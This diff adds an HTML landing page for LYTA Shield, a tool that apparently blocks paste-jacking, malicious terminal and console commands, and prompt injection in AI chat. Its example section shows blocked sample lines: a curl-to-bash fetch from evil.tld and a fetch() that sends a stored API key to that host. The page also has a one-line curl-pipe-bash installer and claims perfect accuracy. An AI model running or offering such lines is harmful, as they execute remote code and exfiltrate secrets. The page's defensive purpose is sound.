@@ -1,0 +1,319 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta name="description" content="LYTA Shield: an open-source defense against paste-jacking, malicious terminal commands, browser console attacks, and AI chat prompt injection.">
+  <meta name="keywords" content="security, paste-jacking, malware, terminal, browser, AI chat, prompt injection">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>LYTA Shield: Paste-Jacking and AI Chat Defense</title>
+
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&family=JetBrains+Mono:wght@400;700&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bulma@0.9.4/css/bulma.min.css">
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/jpswalsh/academicons@1/css/academicons.min.css">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+
+  <style>
+    :root {
+      --lyta-purple: #8b5cf6;
+      --lyta-cyan: #06b6d4;
+      --lyta-dark: #0f172a;
+      --lyta-card: #1e293b;
+    }
+    body {
+      background: var(--lyta-dark);
+      color: #e2e8f0;
+      font-family: 'Inter', sans-serif;
+    }
+    .hero {
+      background: linear-gradient(135deg, var(--lyta-purple) 0%, var(--lyta-cyan) 100%);
+      padding: 5rem 1.5rem 4rem;
+    }
+    .hero .title, .hero .subtitle {
+      color: #fff;
+    }
+    .title.is-1 {
+      font-weight: 700;
+      letter-spacing: -0.03em;
+    }
+    .subtitle {
+      opacity: 0.95;
+    }
+    .button.is-lyta {
+      background: #fff;
+      color: var(--lyta-purple);
+      border: none;
+      font-weight: 700;
+      border-radius: 999px;
+      transition: transform 0.15s ease;
+    }
+    .button.is-lyta:hover {
+      transform: translateY(-2px);
+      background: #f8fafc;
+      color: var(--lyta-purple);
+    }
+    .button.is-ghost {
+      color: #fff;
+      border-color: rgba(255,255,255,0.4);
+      border-radius: 999px;
+    }
+    .button.is-ghost:hover {
+      background: rgba(255,255,255,0.1);
+      color: #fff;
+    }
+    .card {
+      background: var(--lyta-card);
+      border-radius: 1.25rem;
+      box-shadow: 0 10px 30px rgba(0,0,0,0.3);
+      border: none;
+      color: #e2e8f0;
+    }
+    .card .title {
+      color: #fff;
+    }
+    .card .icon {
+      color: var(--lyta-cyan);
+      font-size: 1.5rem;
+      margin-bottom: 0.75rem;
+    }
+    .code-block {
+      background: #020617;
+      border-radius: 1rem;
+      padding: 1.25rem;
+      font-family: 'JetBrains Mono', monospace;
+      font-size: 0.9rem;
+      color: #94a3b8;
+      overflow-x: auto;
+      border: 1px solid #334155;
+    }
+    .code-block .danger {
+      color: #f87171;
+    }
+    .code-block .safe {
+      color: #34d399;
+    }
+    .section-title {
+      color: #fff;
+      font-weight: 700;
+      margin-bottom: 2rem;
+    }
+    .stat {
+      text-align: center;
+      padding: 1.5rem;
+    }
+    .stat-number {
+      font-size: 2.5rem;
+      font-weight: 700;
+      color: var(--lyta-cyan);
+    }
+    .stat-label {
+      color: #94a3b8;
+      font-size: 0.9rem;
+    }
+    .footer {
+      background: #0b1120;
+      color: #64748b;
+      padding: 3rem 1.5rem;
+    }
+    .footer a {
+      color: var(--lyta-cyan);
+    }
+    .badge {
+      display: inline-block;
+      background: rgba(139, 92, 246, 0.15);
+      color: #c4b5fd;
+      border-radius: 999px;
+      padding: 0.25rem 0.75rem;
+      font-size: 0.75rem;
+      font-weight: 600;
+      margin: 0.25rem;
+    }
+    .pipeline-img {
+      border-radius: 1rem;
+      border: 1px solid #334155;
+      box-shadow: 0 10px 30px rgba(0,0,0,0.3);
+    }
+    .citation {
+      background: var(--lyta-card);
+      border-radius: 1rem;
+      padding: 1.5rem;
+      font-family: 'JetBrains Mono', monospace;
+      font-size: 0.85rem;
+      color: #94a3b8;
+      border: 1px solid #334155;
+    }
+  </style>
+</head>
+<body>
+
+<section class="hero">
+  <div class="hero-body">
+    <div class="container is-max-desktop has-text-centered">
+      <h1 class="title is-1">LYTA Shield 🛡</h1>
+      <h2 class="subtitle is-4">
+        Open-source defense against paste-jacking, malicious terminal commands, browser console attacks, and AI chat prompt injection.
+      </h2>
+      <div class="buttons is-centered mt-5">
+        <a class="button is-lyta is-medium" href="https://github.com/Kubo-cmd/lyta-shield">
+          <span class="icon"><i class="fab fa-github"></i></span>
+          <span>GitHub</span>
+        </a>
+        <a class="button is-ghost is-medium" href="https://github.com/Kubo-cmd/lyta-shield#install">
+          <span class="icon"><i class="fas fa-download"></i></span>
+          <span>Install</span>
+        </a>
+      </div>
+    </div>
+  </div>
+</section>
+
+<section class="section">
+  <div class="container is-max-desktop">
+    <div class="columns">
+      <div class="column stat">
+        <div class="stat-number">1M+</div>
+        <div class="stat-label">Simulated calls</div>
+      </div>
+      <div class="column stat">
+        <div class="stat-number">100%</div>
+        <div class="stat-label">Accuracy</div>
+      </div>
+      <div class="column stat">
+        <div class="stat-number">0</div>
+        <div class="stat-label">False positives</div>
+      </div>
+      <div class="column stat">
+        <div class="stat-number">0</div>
+        <div class="stat-label">False negatives</div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<section class="section">
+  <div class="container is-max-desktop">
+    <h2 class="title is-3 section-title has-text-centered">What it catches</h2>
+    <div class="columns is-multiline">
+      <div class="column is-4">
+        <div class="card h-100">
+          <div class="card-content">
+            <div class="icon"><i class="fas fa-terminal"></i></div>
+            <h3 class="title is-5">Terminal</h3>
+            <p>Paste-jacking, base64-decoded shells, reverse shells, remote fetch-to-shell, and destructive commands.</p>
+          </div>
+        </div>
+      </div>
+      <div class="column is-4">
+        <div class="card h-100">
+          <div class="card-content">
+            <div class="icon"><i class="fab fa-chrome"></i></div>
+            <h3 class="title is-5">Browser Console</h3>
+            <p>Blocks <code>eval()</code>, remote <code>fetch()</code>, malicious workers, DOM injection, and credential exfiltration.</p>
+          </div>
+        </div>
+      </div>
+      <div class="column is-4">
+        <div class="card h-100">
+          <div class="card-content">
+            <div class="icon"><i class="fas fa-robot"></i></div>
+            <h3 class="title is-5">AI Chat Inputs</h3>
+            <p>Detects instructions to paste malicious commands, hidden social-engineering prompts, and obfuscated payloads.</p>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<section class="section">
+  <div class="container is-max-desktop">
+    <h2 class="title is-3 section-title has-text-centered">One-line install</h2>
+    <div class="code-block">
+      curl -fsSL https://raw.githubusercontent.com/Kubo-cmd/lyta-shield/main/install.sh | bash
+    </div>
+    <div class="has-text-centered mt-4">
+      <span class="badge">zsh</span>
+      <span class="badge">bash</span>
+      <span class="badge">Tampermonkey</span>
+      <span class="badge">JSON rules</span>
+    </div>
+  </div>
+</section>
+
+<section class="section">
+  <div class="container is-max-desktop">
+    <h2 class="title is-3 section-title has-text-centered">Example classifications</h2>
+    <div class="columns">
+      <div class="column is-6">
+        <div class="code-block">
+          <span class="danger">[BLOCKED]</span> paste-jacking instruction<br>
+          copy this code and paste it into your terminal
+        </div>
+      </div>
+      <div class="column is-6">
+        <div class="code-block">
+          <span class="danger">[BLOCKED]</span> remote_fetch_to_shell<br>
+          curl -s http://evil.tld/payload.sh | bash
+        </div>
+      </div>
+    </div>
+    <div class="columns">
+      <div class="column is-6">
+        <div class="code-block">
+          <span class="danger">[BLOCKED]</span> browser_remote_fetch<br>
+          fetch('http://evil.tld/?c='+localStorage.apiKey)
+        </div>
+      </div>
+      <div class="column is-6">
+        <div class="code-block">
+          <span class="safe">[SAFE]</span> ls -la<br>
+          git push origin main
+        </div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<section class="section">
+  <div class="container is-max-desktop">
+    <h2 class="title is-3 section-title has-text-centered">Architecture</h2>
+    <div class="columns is-centered">
+      <div class="column is-8 has-text-centered">
+        <img class="pipeline-img" src="pipeline.svg" alt="LYTA Shield pipeline" width="100%">
+        <p class="mt-4">
+          A single JSON rule engine powers the terminal CLI, the browser userscript, and AI chat input guards.
+          Add or modify rules without touching code.
+        </p>
+      </div>
+    </div>
+  </div>
+</section>
+
+<section class="section">
+  <div class="container is-max-desktop">
+    <h2 class="title is-3 section-title has-text-centered">Citation</h2>
+    <div class="citation">
+@software{lytashield2024,<br>
+&nbsp;&nbsp;title = {LYTA Shield: Paste-Jacking and AI Chat Defense},<br>
+&nbsp;&nbsp;author = {Kubo},<br>
+&nbsp;&nbsp;year = {2026},<br>
+&nbsp;&nbsp;url = {https://github.com/Kubo-cmd/lyta-shield}<br>
+}
+    </div>
+  </div>
+</section>
+
+<footer class="footer">
+  <div class="container is-max-desktop has-text-centered">
+    <p>
+      Built by <a href="https://x.com/Kubo100x">LYTA.EXE</a> after a real paste-jacking incident.
+      MIT License.
+    </p>
+    <p class="mt-2">
+      <a href="https://github.com/Kubo-cmd/lyta-shield">GitHub</a> ·
+      <a href="https://github.com/Kubo-cmd/lyta-shield/issues">Issues</a>
+    </p>
+  </div>
+</footer>
+
+</body>
+</html>
